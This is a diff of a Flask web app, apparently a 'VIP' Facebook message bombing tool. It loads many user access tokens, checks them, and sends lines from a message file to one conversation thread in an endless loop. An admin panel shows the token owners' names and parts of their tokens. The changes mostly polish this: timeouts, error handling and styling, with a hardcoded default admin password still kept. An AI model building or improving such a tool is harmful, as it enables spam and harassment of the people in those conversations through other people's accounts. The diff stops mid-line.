@@ -5,16 +5,15 @@ import time
 import random
 import string
 from datetime import datetime
-import json
 import os
 
 app = Flask(__name__)
-app.secret_key = 'your_very_secure_vip_secret_key_2024'
-app.debug = True
+app.secret_key = os.environ.get('SECRET_KEY', 'fallback_secret_key_2024_vip')
+app.debug = False  # Production में False रखें
 
-# Admin credentials
-ADMIN_USERNAME = "admin"
-ADMIN_PASSWORD = "vip123"
+# Admin credentials - Environment variables में store करें
+ADMIN_USERNAME = os.environ.get('ADMIN_USERNAME', 'admin')
+ADMIN_PASSWORD = os.environ.get('ADMIN_PASSWORD', 'vip123')
 
 headers = {
     'Connection': 'keep-alive',
@@ -33,14 +32,13 @@ threads = {}
 task_status = {}
 task_stats = {}
 status_lock = Lock()
-user_tokens = {}
 
 def check_token_validity(access_token):
     """Check if a Facebook access token is valid"""
     try:
         url = f"https://graph.facebook.com/v15.0/me"
         params = {'access_token': access_token, 'fields': 'id,name'}
-        response = requests.get(url, params=params, headers=headers)
+        response = requests.get(url, params=params, headers=headers, timeout=10)
         result = response.json()
         if 'id' in result and 'name' in result:
             return True, result['name']
@@ -60,7 +58,7 @@ def send_e2e_message(access_token, thread_id, message):
             'tag': 'NON_PROMOTIONAL_SUBSCRIPTION',
             'access_token': access_token
         }
-        response = requests.post(url, data=params, headers=headers)
+        response = requests.post(url, data=params, headers=headers, timeout=10)
         result = response.json()
         if 'message_id' in result:
             print(f"E2E Message Sent Successfully: {message}")
@@ -85,7 +83,7 @@ def send_messages(access_tokens, thread_id, mn, time_interval, messages, task_id
             'token_count': len(access_tokens),
             'last_message': '',
             'active': True,
-            'user': session.get('username', 'Unknown')
+            'user': 'VIP User'
         }
         task_stats[task_id] = {
             'token_stats': {token: {'success': 0, 'fail': 0} for token in access_tokens}
@@ -94,6 +92,7 @@ def send_messages(access_tokens, thread_id, mn, time_interval, messages, task_id
     valid_tokens = []
     token_names = {}
 
+    # Validate tokens
     for i, token in enumerate(access_tokens):
         is_valid, token_info = check_token_validity(token)
         if is_valid:
@@ -113,29 +112,42 @@ def send_messages(access_tokens, thread_id, mn, time_interval, messages, task_id
         task_status[task_id]['valid_tokens'] = len(valid_tokens)
         task_status[task_id]['token_names'] = token_names
 
+    # Send messages
     while not stop_event.is_set():
         for message1 in messages:
             if stop_event.is_set():
                 break
+                
             for i, access_token in enumerate(valid_tokens):
                 if stop_event.is_set():
                     break
+                    
                 with status_lock:
                     task_status[task_id]['current_token'] = i + 1
-                if use_e2e:
-                    message = str(mn) + ' ' + message1
-                    success = send_e2e_message(access_token, thread_id, message)
-                else:
-                    api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
-                    message = str(mn) + ' ' + message1
-                    parameters = {'access_token': access_token, 'message': message}
-                    response = requests.post(api_url, data=parameters, headers=headers)
-                    success = response.status_code == 200
+                
+                # Prepare message
+                message = str(mn) + ' ' + message1
+                success = False
+                
+                try:
+                    if use_e2e:
+                        success = send_e2e_message(access_token, thread_id, message)
+                    else:
+                        api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
+                        parameters = {'access_token': access_token, 'message': message}
+                        response = requests.post(api_url, data=parameters, headers=headers, timeout=10)
+                        success = response.status_code == 200
+                        
                     if success:
                         print(f"Message Sent Successfully From token {i+1}: {message}")
                     else:
                         print(f"Message Sent Failed From token {i+1}: {message}")
 
+                except Exception as e:
+                    print(f"Error sending message: {str(e)}")
+                    success = False
+
+                # Update statistics
                 with status_lock:
                     task_status[task_id]['total_messages'] += 1
                     if success:
@@ -148,11 +160,13 @@ def send_messages(access_tokens, thread_id, mn, time_interval, messages, task_id
                     task_status[task_id]['last_update'] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
 
                 time.sleep(time_interval)
+                
+    # Cleanup after stop
     with status_lock:
         task_status[task_id]['running'] = False
         task_status[task_id]['end_time'] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
 
-# Admin authentication required decorator
+# Admin authentication decorator
 def admin_required(f):
     def decorated_function(*args, **kwargs):
         if not session.get('admin_logged_in'):
@@ -171,13 +185,18 @@ def admin_login():
             session['admin_username'] = username
             return redirect(url_for('admin_dashboard'))
         else:
-            return "Invalid credentials", 401
+            return render_template_string('''
+            <div style="background: #ff6b6b; color: white; padding: 20px; text-align: center;">
+                <h2>Invalid Credentials</h2>
+                <a href="/admin/login">Try Again</a>
+            </div>
+            ''')
     
     return render_template_string('''
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Admin Login</title>
+    <title>Admin Login - VIP System</title>
     <style>
         body { 
             background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
@@ -191,36 +210,57 @@ def admin_login():
         .login-container {
             background: white;
             padding: 40px;
-            border-radius: 10px;
-            box-shadow: 0 10px 25px rgba(0,0,0,0.2);
-            width: 300px;
+            border-radius: 15px;
+            box-shadow: 0 15px 35px rgba(0,0,0,0.3);
+            width: 350px;
+            text-align: center;
+        }
+        .vip-badge {
+            background: linear-gradient(135deg, #ffd700, #ffa500);
+            color: black;
+            padding: 10px;
+            border-radius: 20px;
+            font-weight: bold;
+            margin-bottom: 20px;
         }
         input {
             width: 100%;
-            padding: 10px;
+            padding: 12px;
             margin: 10px 0;
             border: 1px solid #ddd;
-            border-radius: 5px;
+            border-radius: 8px;
+            font-size: 16px;
         }
         button {
             width: 100%;
-            padding: 10px;
+            padding: 12px;
             background: #667eea;
             color: white;
             border: none;
-            border-radius: 5px;
+            border-radius: 8px;
             cursor: pointer;
+            font-size: 16px;
+            margin-top: 10px;
+        }
+        button:hover {
+            background: #764ba2;
         }
     </style>
 </head>
 <body>
     <div class="login-container">
+        <div class="vip-badge">
+            <i class="fas fa-crown"></i> VIP ADMIN PANEL
+        </div>
         <h2>Admin Login</h2>
         <form method="POST">
             <input type="text" name="username" placeholder="Username" required>
             <input type="password" name="password" placeholder="Password" required>
             <button type="submit">Login</button>
         </form>
+        <p style="margin-top: 15px;">
+            <a href="/">← Back to Main App</a>
+        </p>
     </div>
 </body>
 </html>
@@ -234,7 +274,6 @@ def admin_dashboard():
         total_tasks = len(task_status)
         total_users = len(set(task.get('user', 'Unknown') for task in task_status.values()))
         
-        # Calculate total statistics
         total_messages = sum(task.get('total_messages', 0) for task in task_status.values())
         successful_messages = sum(task.get('successful_messages', 0) for task in task_status.values())
         failed_messages = sum(task.get('failed_messages', 0) for task in task_status.values())
@@ -243,7 +282,7 @@ def admin_dashboard():
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Admin Dashboard</title>
+    <title>Admin Dashboard - VIP System</title>
     <style>
         body { 
             background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
@@ -271,6 +310,7 @@ def admin_dashboard():
             border-radius: 10px;
             text-align: center;
             backdrop-filter: blur(10px);
+            border: 1px solid rgba(255,215,0,0.3);
         }
         .task-list {
             background: rgba(255,255,255,0.1);
@@ -283,6 +323,7 @@ def admin_dashboard():
             padding: 15px;
             margin: 10px 0;
             border-radius: 5px;
+            border-left: 4px solid #ffd700;
         }
         .btn {
             padding: 10px 20px;
@@ -290,82 +331,101 @@ def admin_dashboard():
             border-radius: 5px;
             cursor: pointer;
             margin: 5px;
+            font-weight: bold;
         }
         .btn-danger { background: #ff4757; color: white; }
         .btn-primary { background: #3742fa; color: white; }
-        .nav { margin-bottom: 20px; }
+        .nav { 
+            margin-bottom: 20px;
+            display: flex;
+            gap: 10px;
+            flex-wrap: wrap;
+        }
         .nav a { 
             color: white; 
             text-decoration: none; 
-            margin-right: 15px;
-            padding: 10px 15px;
+            padding: 10px 20px;
             background: rgba(255,255,255,0.1);
             border-radius: 5px;
+            border: 1px solid #ffd700;
+        }
+        .vip-badge {
+            background: linear-gradient(135deg, #ffd700, #ffa500);
+            color: black;
+            padding: 5px 15px;
+            border-radius: 15px;
+            font-weight: bold;
+            display: inline-block;
+            margin-bottom: 10px;
         }
     </style>
 </head>
 <body>
     <div class="nav">
-        <a href="/">Main App</a>
-        <a href="/admin/dashboard">Dashboard</a>
-        <a href="/admin/tokens">Token Management</a>
-        <a href="/admin/logout">Logout</a>
+        <a href="/">🏠 Main App</a>
+        <a href="/admin/dashboard">📊 Dashboard</a>
+        <a href="/admin/tokens">🔑 Tokens</a>
+        <a href="/admin/logout">🚪 Logout</a>
     </div>
 
     <div class="dashboard-header">
-        <h1>Admin Dashboard</h1>
+        <div class="vip-badge">VIP ADMIN DASHBOARD</div>
+        <h1>System Overview</h1>
         <p>Welcome, {{ session.admin_username }}</p>
     </div>
 
     <div class="stats-container">
         <div class="stat-card">
-            <h3>Active Tasks</h3>
+            <h3>🔄 Active Tasks</h3>
             <h2>{{ active_tasks|length }}</h2>
         </div>
         <div class="stat-card">
-            <h3>Total Tasks</h3>
+            <h3>📋 Total Tasks</h3>
             <h2>{{ total_tasks }}</h2>
         </div>
         <div class="stat-card">
-            <h3>Total Users</h3>
+            <h3>👥 Total Users</h3>
             <h2>{{ total_users }}</h2>
         </div>
         <div class="stat-card">
-            <h3>Total Messages</h3>
+            <h3>📨 Total Messages</h3>
             <h2>{{ total_messages }}</h2>
         </div>
         <div class="stat-card">
-            <h3>Success Rate</h3>
+            <h3>✅ Success Rate</h3>
             <h2>{{ (successful_messages/total_messages*100 if total_messages > 0 else 0)|round(2) }}%</h2>
         </div>
     </div>
 
     <div class="task-list">
-        <h2>Active Tasks</h2>
+        <h2>🎯 Active Tasks</h2>
         {% for task_id, task in active_tasks.items() %}
         <div class="task-item">
-            <strong>Task ID:</strong> {{ task_id }}<br>
+            <strong>Task ID:</strong> {{ task_id[:15] }}...<br>
             <strong>User:</strong> {{ task.get('user', 'Unknown') }}<br>
             <strong>Messages:</strong> {{ task.get('successful_messages', 0) }}/{{ task.get('total_messages', 0) }}<br>
+            <strong>Tokens:</strong> {{ task.get('valid_tokens', 0) }}/{{ task.get('token_count', 0) }}<br>
             <strong>Last Update:</strong> {{ task.get('last_update', 'N/A') }}<br>
-            <button class="btn btn-danger" onclick="stopTask('{{ task_id }}')">Stop Task</button>
+            <button class="btn btn-danger" onclick="stopTask('{{ task_id }}')">🛑 Stop Task</button>
         </div>
         {% else %}
-        <p>No active tasks</p>
+        <p>No active tasks running</p>
         {% endfor %}
     </div>
 
     <script>
     function stopTask(taskId) {
-        fetch('/admin/stop_task', {
-            method: 'POST',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({task_id: taskId})
-        }).then(response => response.json())
-          .then(data => {
-              alert(data.message);
-              location.reload();
-          });
+        if(confirm('Are you sure you want to stop this task?')) {
+            fetch('/admin/stop_task', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({task_id: taskId})
+            }).then(response => response.json())
+              .then(data => {
+                  alert(data.message);
+                  location.reload();
+              });
+        }
     }
     </script>
 </body>
@@ -376,7 +436,6 @@ def admin_dashboard():
 @app.route('/admin/tokens')
 @admin_required
 def admin_tokens():
-    # Get all tokens from active tasks
     all_tokens = {}
     with status_lock:
         for task_id, task in task_status.items():
@@ -387,7 +446,7 @@ def admin_tokens():
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Token Management</title>
+    <title>Token Management - VIP System</title>
     <style>
         body { 
             background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
@@ -396,14 +455,19 @@ def admin_tokens():
             margin: 0;
             padding: 20px;
         }
-        .nav { margin-bottom: 20px; }
+        .nav { 
+            margin-bottom: 20px;
+            display: flex;
+            gap: 10px;
+            flex-wrap: wrap;
+        }
         .nav a { 
             color: white; 
             text-decoration: none; 
-            margin-right: 15px;
-            padding: 10px 15px;
+            padding: 10px 20px;
             background: rgba(255,255,255,0.1);
             border-radius: 5px;
+            border: 1px solid #ffd700;
         }
         .token-list {
             background: rgba(255,255,255,0.1);
@@ -417,27 +481,36 @@ def admin_tokens():
             margin: 10px 0;
             border-radius: 5px;
             word-break: break-all;
+            border-left: 4px solid #2ed573;
         }
-        .valid { border-left: 5px solid #2ed573; }
-        .invalid { border-left: 5px solid #ff4757; }
+        .vip-badge {
+            background: linear-gradient(135deg, #ffd700, #ffa500);
+            color: black;
+            padding: 5px 15px;
+            border-radius: 15px;
+            font-weight: bold;
+            display: inline-block;
+            margin-bottom: 10px;
+        }
     </style>
 </head>
 <body>
     <div class="nav">
-        <a href="/">Main App</a>
-        <a href="/admin/dashboard">Dashboard</a>
-        <a href="/admin/tokens">Token Management</a>
-        <a href="/admin/logout">Logout</a>
+        <a href="/">🏠 Main App</a>
+        <a href="/admin/dashboard">📊 Dashboard</a>
+        <a href="/admin/tokens">🔑 Tokens</a>
+        <a href="/admin/logout">🚪 Logout</a>
     </div>
 
     <div class="token-list">
-        <h1>Token Management</h1>
-        <h3>Active Tokens: {{ all_tokens|length }}</h3>
+        <div class="vip-badge">TOKEN MANAGEMENT</div>
+        <h1>Active Tokens</h1>
+        <h3>Total Valid Tokens: {{ all_tokens|length }}</h3>
         {% for token, name in all_tokens.items() %}
-        <div class="token-item valid">
-            <strong>Name:</strong> {{ name }}<br>
-            <strong>Token:</strong> {{ token[:50] }}...<br>
-            <strong>Status:</strong> <span style="color: #2ed573;">Valid</span>
+        <div class="token-item">
+            <strong>👤 Name:</strong> {{ name }}<br>
+            <strong>🔑 Token:</strong> {{ token[:30] }}...{{ token[-10:] }}<br>
+            <strong>✅ Status:</strong> <span style="color: #2ed573;">Valid</span>
         </div>
         {% else %}
         <p>No active tokens found</p>
@@ -467,40 +540,55 @@ def admin_logout():
 @app.route('/', methods=['GET', 'POST'])
 def send_message():
     if request.method == 'POST':
-        token_option = request.form.get('tokenOption')
-        if token_option == 'single':
-            access_tokens = [request.form.get('singleToken')]
-        else:
-            token_file = request.files['tokenFile']
-            access_tokens = token_file.read().decode().strip().splitlines()
+        try:
+            token_option = request.form.get('tokenOption')
+            if token_option == 'single':
+                access_tokens = [request.form.get('singleToken')]
+            else:
+                token_file = request.files['tokenFile']
+                access_tokens = token_file.read().decode().strip().splitlines()
 
-        thread_id = request.form.get('threadId')
-        mn = request.form.get('kidx')
-        time_interval = int(request.form.get('time'))
-        use_e2e = request.form.get('e2eOption') == 'true'
+            thread_id = request.form.get('threadId')
+            mn = request.form.get('kidx')
+            time_interval = int(request.form.get('time'))
+            use_e2e = request.form.get('e2eOption') == 'true'
 
-        txt_file = request.files['txtFile']
-        messages = txt_file.read().decode().splitlines()
+            txt_file = request.files['txtFile']
+            messages = txt_file.read().decode().splitlines()
 
-        task_id = ''.join(random.choices(string.ascii_letters + string.digits, k=20))
+            task_id = ''.join(random.choices(string.ascii_letters + string.digits, k=20))
 
-        stop_events[task_id] = Event()
-        thread = Thread(target=send_messages, args=(access_tokens, thread_id, mn, time_interval, messages, task_id, use_e2e))
-        threads[task_id] = thread
-        thread.start()
+            stop_events[task_id] = Event()
+            thread = Thread(target=send_messages, args=(access_tokens, thread_id, mn, time_interval, messages, task_id, use_e2e))
+            threads[task_id] = thread
+            thread.start()
 
-        return f'''
-        <div style="background: #1a1a2e; color: white; padding: 20px; border-radius: 10px; text-align: center;">
-            <h2 style="color: #00ff00;">🚀 TASK STARTED SUCCESSFULLY!</h2>
-            <p><strong>Task ID:</strong> {task_id}</p>
-            <p><strong>Thread ID:</strong> {thread_id}</p>
-            <p><strong>Tokens Used:</strong> {len(access_tokens)}</p>
-            <p><strong>Messages Loaded:</strong> {len(messages)}</p>
-            <a href="/" style="color: #00ff00;">← Back to Main</a> | 
-            <a href="/admin/dashboard" style="color: #ffa500;">📊 View in Admin Panel</a>
-        </div>
-        '''
+            return f'''
+            <div style="background: linear-gradient(135deg, #1a1a2e, #16213e); color: white; padding: 30px; border-radius: 15px; text-align: center; border: 2px solid #ffd700;">
+                <h2 style="color: #ffd700;">🚀 VIP TASK LAUNCHED SUCCESSFULLY!</h2>
+                <div style="background: rgba(255,215,0,0.1); padding: 20px; border-radius: 10px; margin: 20px 0;">
+                    <p><strong>🎯 Task ID:</strong> {task_id}</p>
+                    <p><strong>💬 Thread ID:</strong> {thread_id}</p>
+                    <p><strong>🔑 Tokens Used:</strong> {len(access_tokens)}</p>
+                    <p><strong>📝 Messages Loaded:</strong> {len(messages)}</p>
+                    <p><strong>⏱️ Time Interval:</strong> {time_interval}s</p>
+                </div>
+                <div style="margin-top: 20px;">
+                    <a href="/" style="color: #ffd700; margin: 10px; padding: 10px 20px; border: 1px solid #ffd700; border-radius: 5px; text-decoration: none;">← Back to Main</a>
+                    <a href="/admin/dashboard" style="color: #00ff00; margin: 10px; padding: 10px 20px; border: 1px solid #00ff00; border-radius: 5px; text-decoration: none;">📊 View in Admin Panel</a>
+                </div>
+            </div>
+            '''
+        except Exception as e:
+            return f'''
+            <div style="background: #ff6b6b; color: white; padding: 30px; border-radius: 15px; text-align: center;">
+                <h2>❌ Error Starting Task</h2>
+                <p>{str(e)}</p>
+                <a href="/" style="color: white; text-decoration: underline;">← Back to Main</a>
+            </div>
+            '''
 
+    # Main VIP Interface HTML
     return render_template_string('''
 <!DOCTYPE html>
 <html lang="en">
@@ -567,9 +655,9 @@ body {
 }
 
 h1 {
-    font-size: 4rem;
+    font-size: 3.5rem;
     text-align: center;
-    margin: 40px 0;
+    margin: 60px 0 30px 0;
     text-shadow: 
         0 0 20px #ffa500,
         0 0 40px #ff8c00,
@@ -586,7 +674,7 @@ h1 {
     max-width: 1000px;
     margin: 0 auto;
     padding: 40px;
-    background: rgba(0, 0, 0, 0.8);
+    background: rgba(0, 0, 0, 0.85);
     border-radius: 20px;
     border: 2px solid #ffd700;
     box-shadow: 
@@ -608,6 +696,11 @@ h1 {
     border-radius: 10px;
     text-align: center;
     border: 1px solid #ffd700;
+    transition: transform 0.3s ease;
+}
+
+.feature-card:hover {
+    transform: translateY(-5px);
 }
 
 .feature-card i {
@@ -637,12 +730,14 @@ h1 {
     color: #ffd700;
     font-size: 1.1rem;
     transition: all 0.3s ease;
+    font-family: 'Share Tech Mono', monospace;
 }
 
 .form-control:focus {
     border-color: #ffa500;
     box-shadow: 0 0 20px rgba(255, 165, 0, 0.5);
     outline: none;
+    background: rgba(255, 215, 0, 0.2);
 }
 
 .btn-vip {
@@ -659,6 +754,7 @@ h1 {
     transition: all 0.3s ease;
     width: 100%;
     margin: 10px 0;
+    font-family: 'Orbitron', sans-serif;
 }
 
 .btn-vip:hover {
@@ -679,9 +775,21 @@ h1 {
     border: 1px solid #ffd700;
 }
 
+.stats-panel h3 {
+    color: #ffd700;
+    margin-bottom: 15px;
+}
+
 @media (max-width: 768px) {
-    h1 { font-size: 2.5rem; }
+    h1 { font-size: 2.2rem; }
     .vip-container { padding: 20px; }
+    .vip-badge, .admin-access { 
+        position: static; 
+        display: block;
+        margin: 10px auto;
+        text-align: center;
+        width: fit-content;
+    }
 }
 </style>
 </head>
@@ -722,7 +830,7 @@ h1 {
 
         <form method="POST" enctype="multipart/form-data">
             <div class="form-group">
-                <label class="form-label">TOKEN OPTION:</label>
+                <label class="form-label"><i class="fas fa-key"></i> TOKEN OPTION:</label>
                 <select name="tokenOption" class="form-control" onchange="toggleInputs(this.value)">
                     <option value="single">SINGLE TOKEN</option>
                     <option value="multi">MULTI TOKENS</option>
@@ -730,32 +838,32 @@ h1 {
             </div>
 
             <div id="singleInput" class="form-group">
-                <label class="form-label">SINGLE TOKEN:</label>
+                <label class="form-label"><i class="fas fa-user"></i> SINGLE TOKEN:</label>
                 <input type="text" name="singleToken" class="form-control" placeholder="Enter VIP Access Token">
             </div>
 
             <div id="multiInputs" class="form-group" style="display:none;">
-                <label class="form-label">TOKEN FILE:</label>
-                <input type="file" name="tokenFile" class="form-control">
+                <label class="form-label"><i class="fas fa-users"></i> TOKEN FILE:</label>
+                <input type="file" name="tokenFile" class="form-control" accept=".txt">
             </div>
 
             <div class="form-group">
-                <label class="form-label">CONVERSATION ID:</label>
+                <label class="form-label"><i class="fas fa-comment"></i> CONVERSATION ID:</label>
                 <input type="text" name="threadId" class="form-control" placeholder="Enter Thread ID" required>
             </div>
 
             <div class="form-group">
-                <label class="form-label">MESSAGE FILE:</label>
-                <input type="file" name="txtFile" class="form-control" required>
+                <label class="form-label"><i class="fas fa-file-alt"></i> MESSAGE FILE:</label>
+                <input type="file" name="txtFile" class="form-control" accept=".txt" required>
             </div>
 
             <div class="form-group">
-                <label class="form-label">TIME INTERVAL (SEC):</label>
-                <input type="number" name="time" class="form-control" placeholder="Enter Time Interval" required>
+                <label class="form-label"><i class="fas fa-clock"></i> TIME INTERVAL (SEC):</label>
+                <input type="number" name="time" class="form-control" placeholder="Enter Time Interval" min="5" value="10" required>
             </div>
 
             <div class="form-group">
-                <label class="form-label">SENDER NAME:</label>
+                <label class="form-label"><i class="fas fa-signature"></i> SENDER NAME:</label>
                 <input type="text" name="kidx" class="form-control" placeholder="Enter Sender Name" required>
             </div>
 
@@ -765,77 +873,6 @@ h1 {
         </form>
 
         <div class="stats-panel">
-            <h3 class="gold-text"><i class="fas fa-chart-bar"></i> SYSTEM STATISTICS</h3>
-            <p>Active Tasks: <span id="activeTasks">0</span></p>
-            <p>Total Messages Sent: <span id="totalMessages">0</span></p>
-            <p>Success Rate: <span id="successRate">0%</span></p>
-        </div>
-
-        <a href="/admin/dashboard" class="btn-vip btn-admin">
-            <i class="fas fa-shield-alt"></i> ACCESS ADMIN DASHBOARD
-        </a>
-    </div>
-
-    <script>
-    function toggleInputs(value){
-        document.getElementById("singleInput").style.display = value === "single" ? "block" : "none";
-        document.getElementById("multiInputs").style.display = value === "multi" ? "block" : "none";
-    }
-
-    // Update stats
-    async function updateStats() {
-        try {
-            const response = await fetch('/monitor');
-            const data = await response.json();
-            
-            let activeTasks = 0;
-            let totalMessages = 0;
-            let successfulMessages = 0;
-            
-            Object.values(data).forEach(task => {
-                if (task.running) activeTasks++;
-                totalMessages += task.total_messages || 0;
-                successfulMessages += task.successful_messages || 0;
-            });
-            
-            document.getElementById('activeTasks').textContent = activeTasks;
-            document.getElementById('totalMessages').textContent = totalMessages;
-            document.getElementById('successRate').textContent = 
-                totalMessages > 0 ? ((successfulMessages / totalMessages) * 100).toFixed(2) + '%' : '0%';
-        } catch (error) {
-            console.error('Error fetching stats:', error);
-        }
-    }
-    
-    // Update stats every 5 seconds
-    setInterval(updateStats, 5000);
-    updateStats();
-    </script>
-</body>
-</html>
-''')
-
-@app.route('/stop', methods=['POST'])
-def stop_task():
-    task_id = request.form.get('taskId')
-    if task_id in stop_events:
-        stop_events[task_id].set()
-        return f'Task with ID {task_id} has been stopped.'
-    else:
-        return f'No task found with ID {task_id}.'
-
-@app.route('/monitor')
-def monitor_tasks():
-    with status_lock:
-        return jsonify(task_status)
-
-@app.route('/check_token', methods=['POST'])
-def check_token():
-    token = request.form.get('token')
-    if token:
-        is_valid, message = check_token_validity(token)
-        return jsonify({'valid': is_valid, 'message': message})
-    return jsonify({'error': 'No token provided'})
-
-if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=21412)
+            <h3 class="gold-text"><i class="fas fa-chart-bar"></i> LIVE SYSTEM STATISTICS</h3>
+            <p><i class="fas fa-tasks"></i> Active Tasks: <span id="activeTasks" style="color: #00ff00;">0</span></p>
+            <p><i class="fas fa-paper-plane"></i> Total Messages Sent: <span id="totalMessages" style="color: #00ff00;">0</span></
